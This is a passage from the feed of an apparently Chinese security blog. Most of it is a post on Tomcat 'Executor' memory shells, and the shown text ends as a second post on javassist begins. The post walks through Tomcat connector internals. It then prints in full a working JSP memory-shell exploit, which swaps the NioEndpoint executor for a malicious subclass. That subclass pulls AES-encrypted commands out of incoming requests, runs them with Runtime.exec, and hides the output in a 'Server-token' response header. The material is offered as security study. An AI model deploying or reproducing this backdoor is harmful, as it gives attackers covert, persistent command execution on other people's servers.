href="https://xz.aliyun.com/t/11593?time__1311=n4+hiIqGx0xfxCw4mqGNapDNDkIetK4GOexAoTD&u_atoken=0088f6c6149c7ae10aab8ab2e8ed1bd8&u_asig=0a472f9217270143300633216e003d">Executor内存马的实现 - 先知社区 (aliyun.com)</a></p><p>这里又引用文章中connector的结构图：</p><p><img src="https://cdn.clown2024.cn/202409230948596.png" alt="image-20240923094855433"></p><p>connector就分为ProtocolHandler和Adapter，ProtocolHandler就用来处理请求，Adapter就是connector和container的桥梁，用于将处理后的请求传递给container</p><p>有关于ProtocolHandler的分类在前面的内存马也了解了一点，文章中又做了一个导图来分类更加清晰，也放一下</p><p><img src="https://cdn.clown2024.cn/202409230957003.png" alt="image-20240923095712898"></p><p>这里关注Http11NioProtocol的实现</p><p>Endpoint是ProtocolHandler的组成之一，而NioEndpoint是Http11NioProtocl中的实现。<br>Endpoint五大组件：</p><ul><li>LimitLatch：连接控制器，负责控制最大的连接数</li><li>Acceptor：负责接收新的连接，然后返回一个Channel对象给Poller</li><li>Poller：可以将其看成是NIO中Selector，负责监控Channel的状态</li><li>SocketProcessor：可以看成是一个被封装的任务类</li><li>Executor：Tomcat自己扩展的线程池，用来执行任务类</li></ul><p>重点看Executor的过程</p><p><img src="https://cdn.clown2024.cn/202409242331554.png" alt="image-20240924233136428"></p><p>我们这里在AbstractEndPoint#processSocket方法处打断点，可以看到他这里创建了一个Executor，然后下一步execute了一个线程任务</p><blockquote><p>在Tomcat中Executor由Service维护，因此同一个Service中的组件可以共享一个线程池。如果没有定义任何线程池，相关组件( 如Endpoint)会自动创建线程池，此时，线程池不再共享。</p></blockquote><p>跟进去execute方法看看</p><p><img src="https://cdn.clown2024.cn/202409242335057.png" alt="image-20240924233503993"></p><p><img src="https://cdn.clown2024.cn/202409242335760.png" alt="image-20240924233534681"></p><p>所以知道逻辑后和前面一样，继承对应的类然后将恶意代码重写进方法里面</p><p>这里的Executor类是ThreadPoolExecutor类</p><p><img src="https://cdn.clown2024.cn/202409271641484.png" alt="image-20240927164111381"></p><p>该类继承的源头就是Executor接口</p><p><img src="https://cdn.clown2024.cn/202409271644613.png" alt="image-20240927164456561"></p><p>文章中是继承了ThreadPoolExecutor类然后重写了execute方法，然后通过AbstractEndPoint的setExecutor方法将原来的executor替换为我们的恶意类即可</p><p><img src="https://cdn.clown2024.cn/202409271652002.png" alt="image-20240927165222949"></p><p><strong>替换Executor</strong></p><p>那要怎么替换executor呢，那照例最好也是从request看能不能找到AbstractEndPoint对象，恰好我们能找到这样的路径</p><p>request(RequestFacade)–&gt;request(Request)–&gt;connector(Connector)–&gt;protocolHandler(Http11NioProtocol)–&gt;endpoint(NioEndpoint)–&gt;acceptors(AbstractEndpoint)</p><p>然后也是和前面一样反射获取然后调用setExecutor方法即可</p><p><strong>回显问题</strong></p><p>现在我们虽然可以替换了，但是数据还无法回显出来，因为我们的ServletRequest还没有封装，需要到后面的Processor阶段才行，我们当前还在EndPoint阶段</p><p>那就需要我们能够挖掘出哪个对象里面存放着Request对象，我们需要挖出一条链子，然后我们往Request对象上封装我们的命令结果，比如将结果添加到请求头上回显出来</p><p>挖掘参考这篇文章，属实是学到了：<a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/</a></p><p>里面有一个对象搜索工具，可以很方便的完成对request对象的搜索：<a href="https://github.com/c0ny1/java-object-searcher">https://github.com/c0ny1/java-object-searcher</a></p><blockquote><p>这个工具只有源码，我使用的时候是先用maven的install指令导出jar包到本地仓库，然后再通过pom文件来引入</p></blockquote><p>然后根据文档用下面代码搜索request</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servletshell;<br><br><br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;<br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;<br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@WebServlet(&quot;/test&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//设置搜索类型包含ServletRequest，RequstGroup，Request...等关键字的对象</span><br>        List&lt;Keyword&gt; keys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;request&quot;</span>).build());<br>        <span class="hljs-comment">//设置黑名单</span><br>        List&lt;Blacklist&gt; blacklists = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        blacklists.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Blacklist</span>.Builder().setField_type(<span class="hljs-string">&quot;java.io.File&quot;</span>).build());<br>        <span class="hljs-comment">//新建一个广度优先搜索Thread.currentThread()的搜索器</span><br>        <span class="hljs-type">SearchRequstByBFS</span> <span class="hljs-variable">searcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);<br>        <span class="hljs-comment">//打开调试模式</span><br>        searcher.setIs_debug(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//挖掘深度为20</span><br>        searcher.setMax_search_depth(<span class="hljs-number">20</span>);<br>        <span class="hljs-comment">//设置报告保存位置</span><br>        searcher.setReport_save_path(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\ServletShell&quot;</span>);<br>        searcher.searchObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409272014082.png" alt="image-20240927201422968"></p><p>这里给出了很多的链子，我们Ctrl+F去搜索**request &#x3D;**找一下能利用的，文章中找的是这条链子</p><p><img src="https://cdn.clown2024.cn/202409272035854.png" alt="image-20240927203519789"></p><p>里面有个NioEndpoint，刚好是我们能获取到的，我们在这里下断点然后step over去调试</p><p><img src="https://cdn.clown2024.cn/202409272028044.png" alt="image-20240927202757759"></p><p>打完断点之后我们就到堆栈的Thread的位置开始顺着链子找</p><p><img src="https://cdn.clown2024.cn/202409272105715.png" alt="image-20240927210521619"></p><p>最终我们可以找到request</p><p>然后再往里找，可以找到一个inputBuffer，里面存放着我们的GET内容</p><p><img src="https://cdn.clown2024.cn/202409272109789.png" alt="image-20240927210934698"></p><p>可以将字节数组view as string，然后查看即可，现在我们就可以做到将命令放入request的请求头中，下一步就是要将其作为response的header传出</p><p>这里response对象和request在同一级下，都在connections里面</p><p><img src="https://cdn.clown2024.cn/202409272120291.png" alt="image-20240927212000209"></p><p>这样response我们也有了，提前将结果封装进response即可，现在就来编写内存马</p><h2 id="内存马编写"><a href="#内存马编写-2" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>留个坑先，分析得好累也还没明白，别人的内存马exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.net.NioEndpoint&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.TimeUnit&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.BlockingQueue&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.ThreadFactory&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.ByteBuffer&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.ArrayList&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.RejectedExecutionHandler&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br><br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SECRET_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;blueblueblueblue&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">AES</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] KEY_VI = <span class="hljs-string">&quot;blueblueblueblue&quot;</span>.getBytes();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CIPHER_ALGORITHM</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">base64Encoder</span> <span class="hljs-operator">=</span> java.util.Base64.getEncoder();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">base64Decoder</span> <span class="hljs-operator">=</span> java.util.Base64.getDecoder();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decode</span><span class="hljs-params">(String key, String content)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            javax.crypto.<span class="hljs-type">SecretKey</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(), AES);<br>            javax.crypto.<span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);<br>            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, secretKey, <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.IvParameterSpec(KEY_VI));<br><br>            <span class="hljs-type">byte</span>[] byteContent = base64Decoder.decode(content);<br>            <span class="hljs-type">byte</span>[] byteDecode = cipher.doFinal(byteContent);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(byteDecode, java.nio.charset.StandardCharsets.UTF_8);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encode</span><span class="hljs-params">(String key, String content)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            javax.crypto.<span class="hljs-type">SecretKey</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(), AES);<br>            javax.crypto.<span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);<br>            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey, <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.IvParameterSpec(KEY_VI));<br>            <span class="hljs-type">byte</span>[] byteEncode = content.getBytes(java.nio.charset.StandardCharsets.UTF_8);<br>            <span class="hljs-type">byte</span>[] byteAES = cipher.doFinal(byteEncode);<br>            <span class="hljs-keyword">return</span> base64Encoder.encodeToString(byteAES);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getField</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>        Field declaredField;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> object.getClass();<br>        <span class="hljs-keyword">while</span> (clazz != Object.class) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br><br>                declaredField = clazz.getDeclaredField(fieldName);<br>                declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span> declaredField.get(object);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            &#125;<br>            clazz = clazz.getSuperclass();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getStandardService</span><span class="hljs-params">()</span> &#123;<br>        Thread[] threads = (Thread[]) <span class="hljs-built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>            <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((thread.getName().contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="hljs-string">&quot;http&quot;</span>))) &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">jioEndPoint</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    jioEndPoint = getField(target, <span class="hljs-string">&quot;this$0&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (jioEndPoint == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        jioEndPoint = getField(target, <span class="hljs-string">&quot;endpoint&quot;</span>);<br>                    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> jioEndPoint;<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    &#125;<br><br>    <span class="hljs-comment">//恶意executor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">threadexcutor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ThreadPoolExecutor</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">threadexcutor</span><span class="hljs-params">(<span class="hljs-type">int</span> corePoolSize, <span class="hljs-type">int</span> maximumPoolSize, <span class="hljs-type">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler)</span> &#123;<br>            <span class="hljs-built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRequest</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>));<br><br>                <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>                    <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">threadName</span> <span class="hljs-operator">=</span> thread.getName();<br>                        <span class="hljs-keyword">if</span> (!threadName.contains(<span class="hljs-string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                            <span class="hljs-keyword">if</span> (target <span class="hljs-keyword">instanceof</span> Runnable) &#123;<br>                                <span class="hljs-keyword">try</span> &#123;<br><br><br>                                    Object[] objects = (Object[]) getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;nioChannels&quot;</span>), <span class="hljs-string">&quot;stack&quot;</span>);<br><br><br>                                    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">heapByteBuffer</span> <span class="hljs-operator">=</span> (ByteBuffer) getField(getField(objects[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;appReadBufHandler&quot;</span>), <span class="hljs-string">&quot;byteBuffer&quot;</span>);<br>                                    <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(heapByteBuffer.array(), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br><br>                                    <span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>) &gt; -<span class="hljs-number">1</span>) &#123;<br>                                        System.out.println(a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>));<br>                                        System.out.println(a.indexOf(<span class="hljs-string">&quot;\r&quot;</span>, a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>)) - <span class="hljs-number">1</span>);<br>                                        <span class="hljs-type">String</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a.substring(a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>) + <span class="hljs-string">&quot;blue0&quot;</span>.length() + <span class="hljs-number">1</span>, a.indexOf(<span class="hljs-string">&quot;\r&quot;</span>, a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>)) - <span class="hljs-number">1</span>);<br><br>                                        b = decode(DEFAULT_SECRET_KEY, b);<br><br>                                        <span class="hljs-keyword">return</span> b;<br>                                    &#125;<br><br>                                &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>                                    System.out.println(var11);<br>                                    <span class="hljs-keyword">continue</span>;<br>                                &#125;<br><br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>();<br>        &#125;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getResponse</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] res)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>));<br><br>                <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>                    <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">threadName</span> <span class="hljs-operator">=</span> thread.getName();<br>                        <span class="hljs-keyword">if</span> (!threadName.contains(<span class="hljs-string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                            <span class="hljs-keyword">if</span> (target <span class="hljs-keyword">instanceof</span> Runnable) &#123;<br>                                <span class="hljs-keyword">try</span> &#123;<br>                                    <span class="hljs-type">ArrayList</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> (ArrayList) getField(getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;handler&quot;</span>), <span class="hljs-string">&quot;global&quot;</span>), <span class="hljs-string">&quot;processors&quot;</span>);<br>                                    <span class="hljs-keyword">for</span> (Object tmp_object : objects) &#123;<br>                                        <span class="hljs-type">RequestInfo</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (RequestInfo) tmp_object;<br>                                        <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> (Response) getField(getField(request, <span class="hljs-string">&quot;req&quot;</span>), <span class="hljs-string">&quot;response&quot;</span>);<br>                                        response.addHeader(<span class="hljs-string">&quot;Server-token&quot;</span>, encode(DEFAULT_SECRET_KEY,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(res, <span class="hljs-string">&quot;UTF-8&quot;</span>)));<br><br>                                    &#125;<br>                                &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>                                    <span class="hljs-keyword">continue</span>;<br>                                &#125;<br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>            &#125;<br>        &#125;<br><br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(Runnable command)</span> &#123;<br><span class="hljs-comment">//            System.out.println(&quot;123&quot;);</span><br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> getRequest();<br>            <span class="hljs-keyword">if</span> (cmd.length() &gt; <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> rt.exec(cmd);<br>                    java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> process.getInputStream();<br><br>                    java.io.<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">resultReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(in);<br>                    java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">stdInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(resultReader);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                    <span class="hljs-keyword">while</span> ((tmp = stdInput.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                        s += tmp;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (s != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                        <span class="hljs-type">byte</span>[] res = s.getBytes(StandardCharsets.UTF_8);<br>                        getResponse(res);<br>                    &#125;<br><br><br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br><br><br>            <span class="hljs-built_in">this</span>.execute(command, <span class="hljs-number">0L</span>, TimeUnit.MILLISECONDS);<br>        &#125;<br><br>    &#125;<br><br>%&gt;<br><br>&lt;%<br>    <span class="hljs-type">NioEndpoint</span> <span class="hljs-variable">nioEndpoint</span> <span class="hljs-operator">=</span> (NioEndpoint) getStandardService();<br>    <span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> (ThreadPoolExecutor) getField(nioEndpoint, <span class="hljs-string">&quot;executor&quot;</span>);<br>    <span class="hljs-type">threadexcutor</span> <span class="hljs-variable">exe</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">threadexcutor</span>(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());<br>    nioEndpoint.setExecutor(exe);<br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实前面的传统web应用内存马也是tomcat这部分的，因为它基于tomcat进行分析不过问题不大，别的中间件应该也是有这些基本组件的。&lt;/p&gt;
&lt;h1 id=&quot;tomcat-valve内存马&quot;&gt;&lt;a href=&quot;#Tomcat-Valve内存马&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="内存马" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>javassist学习</title>
    <link href="https://clowsman.github.io/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-05T15:35:52.000Z</published>
    <updated>2024-09-07T09:56:25.699Z</updated>
    
    <content type="html"><![CDATA[<p>因为看到在缩短payload的时候会用到，赶紧来学习一下，参考文章：<a href="https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/">https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</a></p><p>这是官方文档：<a href="http://www.javassist.org/tutorial/tutorial.html">http://www.javassist.org/tutorial/tutorial.html</a></p><h1 id="javassist介绍"><a href="#javassist介绍" class="headerlink" title="javassist介绍"></a>javassist介绍</h1><p>Javassist 是一个开源的分析、编辑和创建Java字节码的类库.；其主要优点在于简单快速. 直接使用 java 编码的形式, 而不需要了解虚拟机指令, 就能动态改变类的结构, 或者动态生成类。</p><p>使用前导入jar包</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Javassist中最为重要的是<code>ClassPool</code>,<code>CtClass</code>, <code>CtMethod</code>以及<code>CtField</code>这几个类.</p><ul><li><code>ClassPool</code>: 一个基于<code>Hashtable</code>实现的<code>CtClass</code>对象容器, 其中键是类名称, 值是表示该类的<code>CtClass</code>对象</li><li><code>CtClass</code>: <code>CtClass</code>表示类, 一个<code>CtClass</code>(编译时类)对象可以处理一个class文件, 这些<code>CtClass</code>对象可以从<code>ClassPool</code>获得</li><li><code>CtMethod</code>: 